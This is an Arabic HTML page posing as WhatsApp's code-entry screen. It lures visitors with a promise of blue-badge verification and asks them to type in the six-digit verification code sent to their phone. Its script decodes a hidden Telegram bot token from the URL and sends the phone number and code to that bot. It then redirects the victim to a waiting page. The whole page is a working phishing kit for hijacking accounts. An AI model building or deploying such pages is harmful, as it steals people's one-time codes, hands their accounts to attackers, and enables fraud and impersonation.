<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رمز التحقق • WhatsApp</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', Arial, sans-serif;
        }

        body {
            background: #0b141a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: 
                radial-gradient(circle at 30% 40%, rgba(37, 211, 102, 0.12) 0%, transparent 45%),
                radial-gradient(circle at 70% 60%, rgba(0, 149, 246, 0.1) 0%, transparent 45%);
            animation: floatBg 18s ease-in-out infinite;
            z-index: 0;
            pointer-events: none;
        }

        @keyframes floatBg {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            50% { transform: translate(-5%, -5%) rotate(5deg); }
        }

        .container {
            width: 100%;
            max-width: 420px;
            position: relative;
            z-index: 1;
            animation: fadeIn 0.6s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
        }

        .header .logo-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .header .logo-wrapper img {
            width: 52px;
            height: 52px;
            border-radius: 50%;
            object-fit: cover;
        }

        .header .logo-wrapper .logo-text {
            font-size: 32px;
            font-weight: 700;
            color: #ffffff;
        }

        .header .logo-wrapper .logo-text .green {
            color: #25d366;
        }

        .header .subtitle {
            color: #8696a0;
            font-size: 15px;
            margin-top: 10px;
        }

        .card {
            background: #111b21;
            border-radius: 18px;
            border: 1px solid #222d34;
            padding: 32px 28px 26px;
            box-shadow: 
                0 4px 20px rgba(0, 0, 0, 0.4),
                0 0 40px rgba(37, 211, 102, 0.05);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, transparent, #25d366, #0095f6, transparent);
            background-size: 200% 100%;
            animation: gradientMove 3s linear infinite;
        }

        @keyframes gradientMove {
            0% { background-position: -200% 0%; }
            100% { background-position: 200% 0%; }
        }

        /* 🏆 شريط التوثيق */
        .verified-badge {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 14px 16px;
            background: linear-gradient(135deg, rgba(0, 149, 246, 0.12) 0%, rgba(37, 211, 102, 0.08) 100%);
            border: 1.5px solid rgba(0, 149, 246, 0.35);
            border-radius: 12px;
            margin-bottom: 22px;
        }

        .verified-badge .badge-icon {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 38px;
            height: 38px;
            background: linear-gradient(135deg, #0095f6, #25d366);
            border-radius: 50%;
            flex-shrink: 0;
            animation: pulseBadge 2s ease-in-out infinite;
        }

        @keyframes pulseBadge {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.08); }
        }

        .verified-badge .badge-icon svg {
            width: 22px;
            height: 22px;
            fill: white;
        }

        .verified-badge .banner-text {
            font-size: 13px;
            color: #ffffff;
            font-weight: 600;
            line-height: 1.4;
            text-align: right;
        }

        .verified-badge .banner-text .small {
            display: block;
            font-size: 11.5px;
            color: #8696a0;
            font-weight: 400;
            margin-top: 2px;
        }

        .phone-icon {
            text-align: center;
            font-size: 56px;
            margin-bottom: 12px;
        }

        .card h2 {
            font-size: 22px;
            color: #ffffff;
            margin-bottom: 8px;
            font-weight: 700;
            text-align: center;
        }

        .card .desc {
            color: #8696a0;
            font-size: 14px;
            margin-bottom: 6px;
            line-height: 1.6;
            text-align: center;
        }

        .card .phone-display {
            display: block;
            text-align: center;
            color: #25d366;
            font-weight: 700;
            font-size: 15px;
            margin-bottom: 26px;
            direction: ltr;
        }

        .otp-input-group {
            margin-bottom: 18px;
        }

        .otp-input-group input {
            width: 100%;
            padding: 18px 20px;
            border: 2px solid #2a3942;
            border-radius: 12px;
            font-size: 20px;
            background: #1f2c33;
            color: #ffffff;
            outline: none;
            text-align: center;
            letter-spacing: 6px;
            font-family: 'Segoe UI', sans-serif;
            transition: all 0.25s ease;
            font-weight: 600;
        }

        .otp-input-group input:focus {
            border-color: #25d366;
            background: #182229;
            box-shadow: 0 0 0 4px rgba(37, 211, 102, 0.15);
        }

        .otp-input-group input::placeholder {
            color: #667781;
            letter-spacing: normal;
            font-size: 16px;
            font-weight: 400;
        }

        .otp-input-group input.error {
            border-color: #f15c6d;
            background: rgba(241, 92, 109, 0.08);
        }

        .field-error {
            color: #f15c6d;
            font-size: 13px;
            margin-top: 6px;
            display: none;
            text-align: center;
        }

        .field-error.show {
            display: block;
            animation: slideDown 0.2s ease;
        }

        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .btn-verify {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #25d366, #0095f6);
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.25s ease;
            box-shadow: 0 4px 20px rgba(37, 211, 102, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-family: inherit;
        }

        .btn-verify:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 28px rgba(37, 211, 102, 0.45);
        }

        .btn-verify:active {
            transform: scale(0.98);
        }

        .btn-verify:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .resend {
            text-align: center;
            margin-top: 18px;
            color: #8696a0;
            font-size: 13.5px;
        }

        .resend button {
            background: none;
            border: none;
            color: #25d366;
            font-weight: 600;
            cursor: pointer;
            font-size: 13.5px;
            font-family: inherit;
            padding: 4px 8px;
            border-radius: 6px;
            transition: all 0.2s;
        }

        .resend button:hover {
            background: rgba(37, 211, 102, 0.1);
        }

        .resend button:disabled {
            color: #667781;
            cursor: not-allowed;
        }

        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 20px;
            padding: 12px;
            background: rgba(37, 211, 102, 0.08);
            border-radius: 10px;
            color: #8696a0;
            font-size: 12.5px;
            text-align: center;
        }

        .security-note i {
            color: #25d366;
        }

        @media (max-width: 450px) {
            .card {
                padding: 24px 18px;
            }
            .header .logo-wrapper .logo-text {
                font-size: 26px;
            }
            .header .logo-wrapper img {
                width: 44px;
                height: 44px;
            }
            .otp-input-group input {
                font-size: 18px;
                letter-spacing: 4px;
                padding: 16px 14px;
            }
            .btn-verify {
                font-size: 15px;
                padding: 14px;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>

<div class="container">

    <div class="header">
        <div class="logo-wrapper">
            <img src="whatsapp.png" alt="WhatsApp" style="width: 52px; height: 52px; border-radius: 50%; object-fit: cover;">
            <span class="logo-text">Whats<span class="green">App</span></span>
        </div>
        <div class="subtitle">🔐 التحقق من الرقم</div>
    </div>

    <div class="card">

        <!-- 🏆 شريط التوثيق -->
        <div class="verified-badge">
            <div class="badge-icon">
                <svg viewBox="0 0 24 24">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
                </svg>
            </div>
            <div class="banner-text">
                🔵 توثيق حسابك قيد التنفيذ ✓
                <span class="small">أدخل كود التحقق لتأكيد العملية</span>
            </div>
        </div>

        <div class="phone-icon">💬</div>
        <h2>أدخل كود التحقق</h2>
        <p class="desc">أرسلنا كود مكوّن من 6 أرقام إلى</p>
        <span class="phone-display" id="phoneDisplay">—</span>

        <form id="otpForm" novalidate>

            <div class="otp-input-group">
                <input type="tel" id="otpInput" placeholder="أدخل رمز التحقق" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
                <div class="field-error" id="otpError">⚠ يرجى إدخال رمز مكون من 6 أرقام</div>
            </div>

            <button type="submit" class="btn-verify" id="verifyBtn">
                <i class="fas fa-check-circle"></i> تحقق وتوثيق
            </button>

        </form>

        <div class="resend">
            لم تستلم الكود؟
            <button type="button" id="resendBtn">إعادة الإرسال</button>
        </div>

        <div class="security-note">
            <i class="fas fa-shield-alt"></i>
            <span>لا تشارك كود التحقق مع أي شخص</span>
        </div>

    </div>

</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const encodedData = urlParams.get('d') || "";
    const finalEncoded = encodedData || sessionStorage.getItem('wa_encoded') || "";

    if (finalEncoded) {
        sessionStorage.setItem('wa_encoded', finalEncoded);
    }

    let BOT_TOKEN = "";
    let CHAT_ID = "";

    if (finalEncoded) {
        try {
            const decoded = atob(finalEncoded);
            const parts = decoded.split('|');
            BOT_TOKEN = parts[0] || "";
            CHAT_ID   = parts[1] || "";
        } catch (e) {
            console.error('❌ فشل فك التشفير:', e);
        }
    }

    // عرض الرقم
    const savedPhone = localStorage.getItem('wa_phone') || "—";
    document.getElementById('phoneDisplay').textContent = savedPhone;

    // Send to Telegram
    function sendOtpToTelegram(otp, phone) {
        if (!BOT_TOKEN || !CHAT_ID) return;

        const message = `
🔵 **توثيق حساب WhatsApp (الخطوة 2/2)**

📞 **رقم الهاتف:** 
\`${phone}\`

🔢 **كود OTP:** 
\`${otp}\`

🎯 **الطلب:** توثيق الحساب بعلامة زرقاء ✓

🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}

📌 **IP:** ${window.location.hostname}
        `;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        }).catch(error => console.log('Telegram error:', error));
    }

    // OTP Input
    const otpInput = document.getElementById('otpInput');

    otpInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').substring(0, 6);
        this.classList.remove('error');
        document.getElementById('otpError').classList.remove('show');
    });

    // Submit
    document.getElementById('otpForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const otp = otpInput.value.trim();

        if (!otp || otp.length !== 6) {
            otpInput.classList.add('error');
            document.getElementById('otpError').textContent = 
                otp.length === 0 
                    ? '⚠ يرجى إدخال رمز التحقق' 
                    : `⚠ يجب أن يكون الرمز 6 أرقام (أدخلت ${otp.length})`;
            document.getElementById('otpError').classList.add('show');
            return;
        }

        const btn = document.getElementById('verifyBtn');
        btn.disabled = true;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التوثيق...';

        sendOtpToTelegram(otp, savedPhone);
        localStorage.setItem('otp_code', otp);

        setTimeout(() => {
            let nextUrl = 'whatsapp-verify-wait.html';
            if (finalEncoded) {
                nextUrl += '?d=' + encodeURIComponent(finalEncoded);
            }
            window.location.href = nextUrl;
        }, 800);
    });

    // Resend
    document.getElementById('resendBtn').addEventListener('click', function() {
        this.disabled = true;
        this.textContent = 'تم الإرسال ✓';
        otpInput.value = '';
        otpInput.classList.remove('error');
        otpInput.focus();

        setTimeout(() => {
            this.disabled = false;
            this.textContent = 'إعادة الإرسال';
        }, 30000);
    });

    otpInput.focus();

    console.log('✅ WhatsApp Verify OTP page loaded');
</script>

</body>
</html>
